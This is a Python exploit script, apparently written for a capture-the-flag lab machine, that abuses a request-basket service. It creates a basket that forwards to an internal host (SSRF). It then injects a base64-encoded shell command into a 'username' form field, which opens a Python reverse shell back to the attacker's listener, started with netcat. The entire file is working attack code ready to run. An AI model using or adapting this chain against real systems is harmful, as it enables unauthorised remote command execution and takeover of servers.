import requests
import sys
import urllib3
import random
import string
import os
import base64


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
BASKET_NAME = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))


def exploit_ssrf(url, INTERNAL_HOST):
    API_URL = url + "api/baskets/" + BASKET_NAME
    PAYLOAD = {
        "forward_url": INTERNAL_HOST,
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }
    r = requests.post(API_URL, json=PAYLOAD, verify=False, proxies=proxies)
    res = r.text
    if "token" in res:
        print("(+) Successfully created basket " + API_URL)
    return API_URL


def curl_cmd(LHOST, LPORT, url):
    INJ_URL = url + BASKET_NAME
    print("(+) Sending payload to " + INJ_URL)
    print(f"[+] Waiting for incoming connection on  " + LPORT)
    netcat = f"nc -lvn {LPORT}"
    os.system(netcat)
    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
    encoded_payload = base64.b64encode(
        payload.encode()).decode()  # encode the payload in Base64
    command = f"curl '{INJ_URL}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
    os.system(command)


def main():
    if len(sys.argv) < 4:
        print("(+) Usage: %s <url> <INTERNAL_HOST> <LHOST><LPORT>" %
              sys.argv[0])
        print(
            "(+) Example: %s http://10.10.11.224:55555/ http://127.0.0.1:80/login 10.10.14.9 1337 " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    INTERNAL_HOST = sys.argv[2]
    LHOST = sys.argv[3]
    LPORT = sys.argv[4]
    exploit_ssrf(url, INTERNAL_HOST)
    curl_cmd(LHOST, LPORT, url)


if __name__ == "__main__":
    main()
